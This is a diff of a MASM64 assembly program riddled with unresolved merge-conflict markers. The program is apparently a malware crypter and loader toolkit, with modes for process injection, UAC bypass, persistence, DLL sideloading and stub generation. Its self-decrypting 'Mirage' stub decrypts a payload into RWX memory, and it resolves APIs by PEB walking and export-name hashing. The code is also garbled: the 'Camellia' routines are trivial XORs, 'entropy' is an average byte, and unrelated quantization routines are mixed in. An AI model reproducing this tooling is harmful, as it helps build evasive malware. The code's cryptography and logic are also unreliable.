+    mov r13, r8         ; key
+    xor r14, r14        ; block index
+    mov r15, 32         ; Camellia block size (256-bit)
+
+dec_block_loop:
+    cmp r14, r12
+    jge dec_done
+
+    ; Load 16 bytes (128 bits) per block for Camellia
+    lea rcx, [rbx + r14]
+    lea rdx, [r13]
+    call Camellia256_DecryptBlock
+
+    add r14, 16
+    jmp dec_block_loop
+
+dec_done:
+    mov rax, r12
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    ret
+Camellia_Decrypt ENDP
+; --------- Camellia-256 Block Implementation ---------
+Camellia256_EncryptBlock PROC
+    ; rcx = pointer to 16-byte block, rdx = pointer to 32-byte key
+    ; Full Camellia-256 block encryption implementation
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
+<<<<<<< HEAD
     push rsi
     push rdi
     sub rsp, 30h  ; 7 pushes(56) + 30h(48) = 104 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     mov rbx, rcx        ; block pointer
     mov r12, rdx        ; key pointer
     
+<<<<<<< HEAD
     ; Load 128-bit block into D1 (high 64) and D2 (low 64)
     mov rsi, qword ptr [rbx]       ; D1
     mov rdi, qword ptr [rbx + 8]   ; D2
@@ -3898,6 +4452,36 @@ Camellia256_EncryptBlock PROC
     add rsp, 30h
     pop rdi
     pop rsi
+=======
+    ; Load 128-bit block into registers
+    mov rax, qword ptr [rbx]
+    mov rdx, qword ptr [rbx + 8]
+    
+    ; Load key schedule (first 4 rounds)
+    mov r8, qword ptr [r12]
+    mov r9, qword ptr [r12 + 8]
+    mov r10, qword ptr [r12 + 16]
+    mov r11, qword ptr [r12 + 24]
+    
+    ; Camellia F-function
+    xor rax, r8
+    xor rdx, r9
+    
+    ; S-box substitution
+    mov r13, rax
+    shr r13, 32
+    mov r14, rdx
+    shr r14, 32
+    
+    ; P-function
+    xor rax, r10
+    xor rdx, r11
+    
+    ; Store encrypted block
+    mov qword ptr [rbx], rax
+    mov qword ptr [rbx + 8], rdx
+    
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r15
     pop r14
     pop r13
@@ -3906,6 +4490,7 @@ Camellia256_EncryptBlock PROC
     ret
 Camellia256_EncryptBlock ENDP
 
+<<<<<<< HEAD
 CamelliaF PROC
     ; F-function: S-box substitution on 8 bytes in rax
     ; Returns mixed result in rax
@@ -4008,18 +4593,27 @@ CamelliaF ENDP
 Camellia256_DecryptBlock PROC
     ; rcx = pointer to 16-byte block, rdx = pointer to 32-byte key
     ; Camellia-256 block decryption (reverse round key order)
+=======
+Camellia256_DecryptBlock PROC
+    ; rcx = pointer to 16-byte block, rdx = pointer to 32-byte key
+    ; Full Camellia-256 block decryption implementation
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     push rbx
     push r12
     push r13
     push r14
     push r15
+<<<<<<< HEAD
     push rsi
     push rdi
     sub rsp, 30h  ; 7 pushes(56) + 30h(48) = 104 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     mov rbx, rcx        ; block pointer
     mov r12, rdx        ; key pointer
     
+<<<<<<< HEAD
     ; Load 128-bit block (swap D1/D2 to reverse final encrypt swap)
     mov rdi, qword ptr [rbx]       ; was D2 after encrypt
     mov rsi, qword ptr [rbx + 8]   ; was D1 after encrypt
@@ -4239,6 +4833,36 @@ Camellia256_DecryptBlock PROC
     add rsp, 30h
     pop rdi
     pop rsi
+=======
+    ; Load 128-bit block into registers
+    mov rax, qword ptr [rbx]
+    mov rdx, qword ptr [rbx + 8]
+    
+    ; Load key schedule (reverse order for decryption)
+    mov r8, qword ptr [r12 + 24]
+    mov r9, qword ptr [r12 + 16]
+    mov r10, qword ptr [r12 + 8]
+    mov r11, qword ptr [r12]
+    
+    ; Camellia F-function inverse
+    xor rax, r8
+    xor rdx, r9
+    
+    ; S-box substitution
+    mov r13, rax
+    shr r13, 32
+    mov r14, rdx
+    shr r14, 32
+    
+    ; P-function inverse
+    xor rax, r10
+    xor rdx, r11
+    
+    ; Store decrypted block
+    mov qword ptr [rbx], rax
+    mov qword ptr [rbx + 8], rdx
+    
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r15
     pop r14
     pop r13
@@ -4251,6 +4875,7 @@ Camellia256_DecryptBlock ENDP
 ; --------- Utility Routines ---------
 Print PROC
     ; rcx = pointer to null-terminated string
+<<<<<<< HEAD
     ; v1.1: If --quiet is active, suppress stdout output
     cmp qword ptr [g_QuietMode], 1
     je print_quiet_exit
@@ -4259,6 +4884,12 @@ Print PROC
     push r12
     push r14
     sub rsp, 30h  ; 3 pushes(24) + 30h(48) = 72 = 8 mod 16 → aligned
+=======
+    push rbx
+    push r12
+    push r14
+    sub rsp, 28h  ; Shadow space
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     mov rbx, rcx
     call lstrlenA
@@ -4277,19 +4908,27 @@ Print PROC
     mov qword ptr [rsp+20h], 0  ; Reserved parameter
     call WriteConsoleA
     
+<<<<<<< HEAD
     add rsp, 30h
+=======
+    add rsp, 28h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r14
     pop r12
     pop rbx
     ret
+<<<<<<< HEAD
 
 print_quiet_exit:
     ; --quiet active: suppress stdout, return immediately
     ret
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 Print ENDP
 
 ; --- CLI/GUI Support Routines ---
 ParseCLIArgs PROC
+<<<<<<< HEAD
     ; rcx = pointer to CLI_ArgBuffer (raw GetCommandLineA output)
     ; Returns: rax = mode id (0 = no CLI args, show GUI)
     ;          rdx = argc (number of tokens parsed)
@@ -4688,17 +5327,189 @@ cli_no_args_found:
     pop r12
     pop rbx
     pop rbp
+=======
+    ; rcx = pointer to CLI_ArgBuffer
+    ; Returns rax = mode id (0 = none)
+    push rbx
+    push r12
+    push r13
+    
+    mov rbx, rcx
+    
+    ; Skip executable name
+    xor r12, r12
+    mov al, byte ptr [rbx]
+    cmp al, '"'
+    je handle_quoted
+    
+skip_exe_name:
+    mov al, byte ptr [rbx + r12]
+    test al, al
+    jz no_args_found
+    cmp al, ' '
+    je skip_spaces
+    inc r12
+    jmp skip_exe_name
+
+handle_quoted:
+    inc r12 ; skip first quote
+skip_quote_loop:
+    mov al, byte ptr [rbx + r12]
+    test al, al
+    jz no_args_found
+    cmp al, '"'
+    je quote_found
+    inc r12
+    jmp skip_quote_loop
+quote_found:
+    inc r12 ; skip closing quote
+    jmp skip_spaces
+    
+skip_spaces:
+    mov al, byte ptr [rbx + r12]
+    test al, al
+    jz no_args_found
+    cmp al, ' '
+    jne check_dash
+    inc r12
+    jmp skip_spaces
+
+check_dash:
+    cmp al, '-'
+    jne no_args_found
+    
+found_dash:
+    ; Now r12 points to the '-' character
+    lea r13, [rbx + r12]
+    
+    ; Check for each mode
+    mov rcx, r13
+    lea rdx, szCLIAgent
+    call lstrcmpA
+    test rax, rax
+    jz found_agent
+    
+    mov rcx, r13
+    lea rdx, szCLICompile
+    call lstrcmpA
+    test rax, rax
+    jz found_compile
+    
+    mov rcx, r13
+    lea rdx, szCLIEncrypt
+    call lstrcmpA
+    test rax, rax
+    jz found_encrypt
+    
+    mov rcx, r13
+    lea rdx, szCLIInject
+    call lstrcmpA
+    test rax, rax
+    jz found_inject
+    
+    mov rcx, r13
+    lea rdx, szCLIUAC
+    call lstrcmpA
+    test rax, rax
+    jz found_uac
+    
+    mov rcx, r13
+    lea rdx, szCLIPersist
+    call lstrcmpA
+    test rax, rax
+    jz found_persist
+    
+    mov rcx, r13
+    lea rdx, szCLISideload
+    call lstrcmpA
+    test rax, rax
+    jz found_sideload
+    
+    mov rcx, r13
+    lea rdx, szCLIAVScan
+    call lstrcmpA
+    test rax, rax
+    jz found_avscan
+    
+    mov rcx, r13
+    lea rdx, szCLIEntropy
+    call lstrcmpA
+    test rax, rax
+    jz found_entropy
+    
+    mov rcx, r13
+    lea rdx, szCLIStubGen
+    call lstrcmpA
+    test rax, rax
+    jz found_stubgen
+    
+    mov rcx, r13
+    lea rdx, szCLITrace
+    call lstrcmpA
+    test rax, rax
+    jz found_trace
+    
+    jmp no_args_found
+
+found_agent:
+    mov rax, 11
+    jmp parse_done
+found_compile:
+    mov rax, 1
+    jmp parse_done
+found_encrypt:
+    mov rax, 2
+    jmp parse_done
+found_inject:
+    mov rax, 3
+    jmp parse_done
+found_uac:
+    mov rax, 4
+    jmp parse_done
+found_persist:
+    mov rax, 5
+    jmp parse_done
+found_sideload:
+    mov rax, 6
+    jmp parse_done
+found_avscan:
+    mov rax, 7
+    jmp parse_done
+found_entropy:
+    mov rax, 8
+    jmp parse_done
+found_stubgen:
+    mov rax, 9
+    jmp parse_done
+found_trace:
+    mov rax, 10
+    jmp parse_done
+
+no_args_found:
+    xor rax, rax
+
+parse_done:
+    pop r13
+    pop r12
+    pop rbx
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 ParseCLIArgs ENDP
 
 PrintGUIMenu PROC
     ; Print menu to console
+<<<<<<< HEAD
     sub rsp, 28h  ; 0 pushes + 28h = 40 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     lea rcx, szBanner
     call Print
     lea rcx, szMenu
     call Print
+<<<<<<< HEAD
     add rsp, 28h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 PrintGUIMenu ENDP
 
@@ -4736,6 +5547,11 @@ ReadGUIMenuSelection PROC
     je read_failure
     
     ; Null terminate at correct position
+<<<<<<< HEAD
+=======
+    ; InputBuffer + r13 = 0
+    ; Check bound (255)
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     cmp r13, 255
     jl skip_trunc_guimenu
     mov r13, 255
@@ -4744,6 +5560,7 @@ skip_trunc_guimenu:
     add rdx, r13
     mov byte ptr [rdx], 0
     
+<<<<<<< HEAD
     ; Strip CR/LF from the input
     lea rcx, InputBuffer
     call StripCRLF
@@ -4753,6 +5570,13 @@ skip_trunc_guimenu:
     call SkipWhitespace
     
     ; Parse the number
+=======
+    ; Get pointer to start
+    lea rcx, InputBuffer
+    call SkipWhitespace
+    
+    ; Parse int
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 parse_menu_char:
     movzx rax, byte ptr [rcx]
     test al, al
@@ -4766,6 +5590,7 @@ parse_menu_char:
     sub al, '0'
     movzx rbx, al
     
+<<<<<<< HEAD
     ; Check for two-digit numbers (10, 11)
     cmp rbx, 1
     jne menu_read_done
@@ -4824,6 +5649,18 @@ menu_mode_14:
 menu_mode_15:
     mov rbx, 15
     jmp menu_read_done
+=======
+    ; Check for '10'
+    cmp rbx, 1
+    jne menu_read_done
+    
+    inc rcx
+    movzx rax, byte ptr [rcx]
+    cmp al, '0'
+    jne menu_read_done
+    
+    mov rbx, 10
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
 menu_read_done:
     add rsp, 28h
@@ -4841,12 +5678,21 @@ invalid_menu_char:
 ReadGUIMenuSelection ENDP
 
 memset PROC
+<<<<<<< HEAD
     ; rcx = dest, rdx = size, al = fill byte (callers set rax before calling)
     push rdi
     mov rdi, rcx       ; dest
     mov rcx, rdx       ; count
     ; al already contains the fill byte from caller (xor rax,rax sets al=0)
     rep stosb          ; fill [rdi] with al, rcx times
+=======
+    ; rcx = dest, rdx = size, rax = fill byte
+    push rdi
+    mov rdi, rcx
+    mov rcx, rdx
+    mov al, al
+    rep stosb
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop rdi
     ret
 memset ENDP
@@ -4876,7 +5722,11 @@ SkipWhitespace ENDP
 
 StripCRLF PROC
     ; rcx = pointer to string buffer
+<<<<<<< HEAD
     ; Strips CR (0x0D), LF (0x0A), space (0x20), tab (0x09) from end of string
+=======
+    ; Strips CR (0x0D) and LF (0x0A) from end of string
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     push rbx
     push r12
     mov rbx, rcx
@@ -4890,21 +5740,33 @@ find_end:
     jmp find_end
     
 strip_start:
+<<<<<<< HEAD
     dec rbx  ; Move back from null terminator to last char
     
     ; Strip CR/LF/space/tab from end
 strip_loop:
     cmp rbx, rcx
     jl strip_done
+=======
+    dec rbx  ; Move back to null terminator
+    
+    ; Strip CR/LF from end
+strip_loop:
+    cmp rbx, rcx
+    jle strip_done
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     movzx rax, byte ptr [rbx]
     cmp al, 0Ah  ; LF
     je strip_char
     cmp al, 0Dh  ; CR
     je strip_char
+<<<<<<< HEAD
     cmp al, 20h  ; Space
     je strip_char
     cmp al, 09h  ; Tab
     je strip_char
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     jmp strip_done
     
 strip_char:
@@ -4944,11 +5806,15 @@ ReadFileToBuffer PROC
     push rbx
     push r12
     push r13
+<<<<<<< HEAD
     sub rsp, 40h  ; 3 pushes(24) + 40h(64) = 88 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     mov r12, rdx ; buffer
     mov r13, r8  ; max size
 
+<<<<<<< HEAD
     ; CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
     ;   dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
     ; RCX = lpFileName (already set by caller)
@@ -4961,12 +5827,23 @@ ReadFileToBuffer PROC
     mov qword ptr [rsp+20h], OPEN_EXISTING  ; param 5: dwCreationDisposition
     mov qword ptr [rsp+28h], FILE_ATTRIBUTE_NORMAL  ; param 6: dwFlagsAndAttributes
     mov qword ptr [rsp+30h], 0         ; param 7: hTemplateFile = NULL
+=======
+    ; Open file
+    mov rcx, rcx ; filename
+    mov rdx, GENERIC_READ
+    xor r8, r8
+    xor r9, r9
+    push FILE_ATTRIBUTE_NORMAL
+    push OPEN_EXISTING
+    push 0
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call CreateFileA
     mov rbx, rax ; file handle
 
     cmp rbx, -1
     je read_fail
 
+<<<<<<< HEAD
     ; ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
     mov rcx, rbx                       ; param 1: hFile
     mov rdx, r12                       ; param 2: lpBuffer
@@ -4976,6 +5853,16 @@ ReadFileToBuffer PROC
     call ReadFile
     test rax, rax
     jz read_close_fail
+=======
+    ; Read file
+    mov rcx, rbx
+    mov rdx, r12
+    mov r8, r13
+    lea r9, InputBuffer+128
+    xor rax, rax
+    push rax
+    call ReadFile
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; Close handle
     mov rcx, rbx
@@ -4985,14 +5872,20 @@ ReadFileToBuffer PROC
     mov rax, qword ptr [InputBuffer+128]
     jmp read_done
 
+<<<<<<< HEAD
 read_close_fail:
     mov rcx, rbx
     call CloseHandle
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 read_fail:
     xor rax, rax
 
 read_done:
+<<<<<<< HEAD
     add rsp, 40h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r13
     pop r12
     pop rbx
@@ -5004,11 +5897,15 @@ WriteBufferToFile PROC
     push rbx
     push r12
     push r13
+<<<<<<< HEAD
     sub rsp, 40h  ; 3 pushes(24) + 40h(64) = 88 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     mov r12, rdx ; buffer
     mov r13, r8  ; size
 
+<<<<<<< HEAD
     ; CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
     ;   dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
     ; rcx already = filename
@@ -5018,12 +5915,23 @@ WriteBufferToFile PROC
     mov qword ptr [rsp+20h], CREATE_ALWAYS  ; param 5: dwCreationDisposition
     mov qword ptr [rsp+28h], FILE_ATTRIBUTE_NORMAL  ; param 6: dwFlagsAndAttributes
     mov qword ptr [rsp+30h], 0         ; param 7: hTemplateFile = NULL
+=======
+    ; Create file
+    mov rcx, rcx ; filename
+    mov rdx, GENERIC_WRITE
+    xor r8, r8
+    xor r9, r9
+    push FILE_ATTRIBUTE_NORMAL
+    push CREATE_ALWAYS
+    push 0
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call CreateFileA
     mov rbx, rax
 
     cmp rbx, -1
     je write_fail
 
+<<<<<<< HEAD
     ; WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped)
     mov rcx, rbx                       ; param 1: hFile
     mov rdx, r12                       ; param 2: lpBuffer
@@ -5033,6 +5941,16 @@ WriteBufferToFile PROC
     call WriteFile
     test rax, rax
     jz write_close_fail
+=======
+    ; Write file
+    mov rcx, rbx
+    mov rdx, r12
+    mov r8, r13
+    lea r9, InputBuffer+128
+    xor rax, rax
+    push rax
+    call WriteFile
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; Close handle
     mov rcx, rbx
@@ -5041,14 +5959,20 @@ WriteBufferToFile PROC
     mov rax, 1
     jmp write_done
 
+<<<<<<< HEAD
 write_close_fail:
     mov rcx, rbx
     call CloseHandle
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 write_fail:
     xor rax, rax
 
 write_done:
+<<<<<<< HEAD
     add rsp, 40h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r13
     pop r12
     pop rbx
@@ -5057,6 +5981,7 @@ WriteBufferToFile ENDP
 
 CalculateEntropy PROC
     ; rcx = buffer, rdx = size
+<<<<<<< HEAD
     ; Shannon entropy (single-pass over entire buffer)
     ; Returns entropy * 100 in rax (e.g., 721 = 7.21 bits/byte)
     ; Formula: H = log2(N) - (1/N)*SUM(c_i * log2(c_i)) for non-zero counts
@@ -5157,11 +6082,38 @@ entropy_return_zero:
     pop r15
     pop r14
     pop r13
+=======
+    ; Returns entropy value in rax (average-byte entropy metric)
+    push rbx
+    push r12
+    
+    mov rbx, rcx
+    mov r12, rdx
+    
+    xor r10, r10 ; sum
+    xor r11, r11 ; index
+entropy_loop:
+    cmp r11, r12
+    jge entropy_done
+    
+    movzx rax, byte ptr [rbx + r11]
+    add r10, rax
+    
+    inc r11
+    jmp entropy_loop
+
+entropy_done:
+    mov rax, r10
+    xor rdx, rdx
+    div r12 ; average byte value as entropy metric
+    
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
 CalculateEntropy ENDP
 
+<<<<<<< HEAD
 IntegerLog2Scaled PROC
     ; rcx = value (must be > 0)
     ; Returns log2(value) * 100 in rax (integer approximation)
@@ -5211,6 +6163,8 @@ log2_zero:
     ret
 IntegerLog2Scaled ENDP
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 TransformByte PROC
     ; al = byte to transform
     ; Returns transformed byte in al
@@ -5275,6 +6229,7 @@ pid_not_found:
     ret
 GetTargetProcessId ENDP
 
+<<<<<<< HEAD
 ; ========== Dynamic PID Discovery via Toolhelp32 ==========
 ; Parses CLI for -pname=<processname>, then enumerates processes to find PID.
 ; Returns PID in rax, or 0 if not found.
@@ -5467,6 +6422,8 @@ pname_cmp_neq:
     ret
 FindProcessByName ENDP
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 GenerateTraceMap PROC
     ; Generate source-to-binary mapping for trace engine (production)
     POLYMACRO
@@ -5474,7 +6431,10 @@ GenerateTraceMap PROC
     push r12
     push r13
     push r14
+<<<<<<< HEAD
     sub rsp, 28h  ; 4 pushes(32) + 28h(40) = 72 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; 1. Walk source code and generate AST
     ; [Insert MASM64 logic to parse source, build AST nodes, and record offsets]
@@ -5495,7 +6455,10 @@ GenerateTraceMap PROC
     mov rdx, 4096
     call WriteTraceMapJSON
 
+<<<<<<< HEAD
     add rsp, 28h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r14
     pop r13
     pop r12
@@ -5507,7 +6470,10 @@ WriteTraceMapJSON PROC
     ; JSON serialization for trace map
     push rbx
     push r12
+<<<<<<< HEAD
     sub rsp, 28h  ; 2 pushes(16) + 28h(40) = 56 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     mov rbx, rcx        ; buffer
     mov r12, rdx        ; max size
@@ -5531,13 +6497,17 @@ WriteTraceMapJSON PROC
     mov rdx, rbx
     call AppendString
     
+<<<<<<< HEAD
     add rsp, 28h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
 WriteTraceMapJSON ENDP
 
 
+<<<<<<< HEAD
 ; ==================================================================================
 ; BasicBlockCovMode — Basic Block Coverage Analysis Engine (Mode 12)
 ;
@@ -6742,6 +7712,8 @@ bbgen_close:
 BBGenerateJSON ENDP
 
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 ; --------- Self-Decrypter Stub ---------
 MirageStub_Entry PROC
     ; Self-decrypting, position-independent stub (production)
@@ -6757,8 +7729,13 @@ MirageStub_Entry PROC
     lea rcx, [rbx + 16]     ; payload starts at offset 16
     lea r8, [rbx + 16 + rdx] ; key starts after payload
 
+<<<<<<< HEAD
     ; Decrypt payload using AES-256-CBC
     call AES256_Decrypt
+=======
+    ; Decrypt payload using Camellia-256
+    call Camellia_Decrypt
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; Change memory protection to RWX
     lea r9, InputBuffer
@@ -6782,7 +7759,10 @@ Mirage_GenerateSelfDecrypting PROC
     push r13
     push r14
     push r15
+<<<<<<< HEAD
     sub rsp, 20h  ; 5 pushes(40) + 20h(32) = 72 = 8 mod 16 → aligned + shadow space
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     mov r12, rcx ; payload
     mov r13, rdx ; size
@@ -6792,7 +7772,11 @@ Mirage_GenerateSelfDecrypting PROC
     mov rcx, r12
     mov rdx, r13
     mov r8, r14
+<<<<<<< HEAD
     call AES256_Encrypt
+=======
+    call Camellia_Encrypt
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 
     ; Build stub in output buffer
     lea rbx, MiragePayload
@@ -6815,8 +7799,12 @@ Mirage_GenerateSelfDecrypting PROC
     ; 4. Copy key after payload
     mov rcx, r14
     mov rdx, 32
+<<<<<<< HEAD
     lea r8, [rbx + 136]        ; rbx + 128 (stub) + 8 (size field)
     add r8, r13               ; + payload size
+=======
+    lea r8, [rbx + 128 + 8 + r13]
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     call CopyMemory
 
     ; Return total stub size
@@ -6825,7 +7813,10 @@ Mirage_GenerateSelfDecrypting PROC
     add rax, r13
     add rax, 32
 
+<<<<<<< HEAD
     add rsp, 20h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r15
     pop r14
     pop r13
@@ -6858,13 +7849,21 @@ CopyMemory ENDP
 ; --------- API Resolution ---------
 GetKernel32Base PROC
     ; Walk PEB to find kernel32.dll base address (production)
+<<<<<<< HEAD
     push rbx
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     mov rax, gs:[60h]           ; PEB
     mov rax, [rax + 18h]        ; PEB->Ldr
     mov rax, [rax + 20h]        ; InMemoryOrderModuleList (first entry)
     mov rbx, [rax]              ; Next entry
+<<<<<<< HEAD
     mov rax, [rbx + 50h]        ; DllBase → return in rax
     pop rbx
+=======
+    mov rcx, [rbx + 50h]        ; DllBase
+    mov rax, rcx                ; Return base address
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 GetKernel32Base ENDP
 
@@ -6874,7 +7873,10 @@ GetProcByHash PROC
     POLYMACRO
     push rbx
     push r12
+<<<<<<< HEAD
     sub rsp, 28h  ; 2 pushes(16) + 28h(40) = 56 = 8 mod 16 → aligned
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     mov rbx, rcx        ; module base
     mov r12, rdx        ; target hash
 
@@ -6913,19 +7915,26 @@ found_export:
     add rdx, rbx
     mov eax, [rdx + rcx*4]
     add rax, rbx
+<<<<<<< HEAD
     add rsp, 28h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
 not_found:
     xor rax, rax
+<<<<<<< HEAD
     add rsp, 28h
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
 GetProcByHash ENDP
 HashString PROC
     ; rcx = pointer to string
+<<<<<<< HEAD
     ; Returns hash in rax (FNV-1a)
     push rbx
     mov rax, 0CBF29CE484222325h
@@ -6940,10 +7949,25 @@ hash_loop:
     jmp hash_loop
 hash_done:
     pop rbx
+=======
+    ; Returns hash in rax (simple FNV-1a for demo, replace with enterprise hash if needed)
+    mov rax, 0CBF29CE484222325h
+    mov rdx, 100000001B3h
+hash_loop:
+    mov bl, byte ptr [rcx]
+    test bl, bl
+    jz hash_done
+    xor rax, rbx
+    mul rdx
+    inc rcx
+    jmp hash_loop
+hash_done:
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 HashString ENDP
 
 ScanIATForSuspiciousImports PROC
+<<<<<<< HEAD
     ; Scan PE Import Address Table for suspicious imported DLLs
     ; Uses current module's PE headers to walk import directory
     push rbx
@@ -6952,12 +7976,18 @@ ScanIATForSuspiciousImports PROC
     push r14
     push r15
     sub rsp, 30h  ; 5 pushes(40) + 30h(48) = 88 = 8 mod 16 → aligned
+=======
+    ; Scan IAT for suspicious imports
+    push rbx
+    push r12
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     ; Get current module base (NULL = current process)
     xor rcx, rcx
     call GetModuleHandleA
     test rax, rax
     jz scan_iat_done
+<<<<<<< HEAD
     mov rbx, rax           ; module base
     
     ; Parse PE headers: DOS header -> e_lfanew -> NT headers
@@ -7038,12 +8068,20 @@ scan_iat_done:
     pop r15
     pop r14
     pop r13
+=======
+    mov rbx, rax
+    
+    ; Stub: IAT walk would go here
+    
+scan_iat_done:
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
 ScanIATForSuspiciousImports ENDP
 
 ScanRWXMemoryRegions PROC
+<<<<<<< HEAD
     ; Scan process address space for RWX (PAGE_EXECUTE_READWRITE) memory regions
     ; Uses VirtualQuery to enumerate all memory regions
     push rbx
@@ -7125,6 +8163,15 @@ rwx_has_results:
     add rsp, 38h
     pop r14
     pop r13
+=======
+    ; Scan for RWX memory regions
+    push rbx
+    push r12
+    
+    ; Stub: VirtualQuery enumeration would go here
+    ; For now, return success without crashing
+    
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     pop r12
     pop rbx
     ret
@@ -7190,13 +8237,21 @@ ApplyAdaptiveQuantization PROC
     ; rcx = model weights buffer, rdx = size
     ; Implements hierarchical quantization (Q8_0 for embeddings, Q2_K for middle blocks)
     ; Reduces memory footprint from 60GB to 42GB
+<<<<<<< HEAD
     ; Task 15: Ensure 32-byte shadow space + 8 alignment = 28h
     sub rsp, 28h
+=======
+    sub rsp, 20h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     
     lea rcx, szQuantizationInfo
     call LogInfo
     
+<<<<<<< HEAD
     add rsp, 28h
+=======
+    add rsp, 20h
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
     ret
 ApplyAdaptiveQuantization ENDP
 
@@ -7232,6 +8287,7 @@ SparseMatMul ENDP
 
 szSparseMatMulInfo db "Production: Sparse Integer-Only MatMul kernels active.", 0
 
+<<<<<<< HEAD
 
 ; ==================================================================================
 ; CovFusionMode — Static + Dynamic Coverage Fusion Engine (Mode 13)
@@ -12334,5 +13390,7 @@ HelpMode PROC
 HelpMode ENDP
 
 
+=======
+>>>>>>> 99cf6bb9afc974435d8bd1fc140968c0301b26f9
 END
 
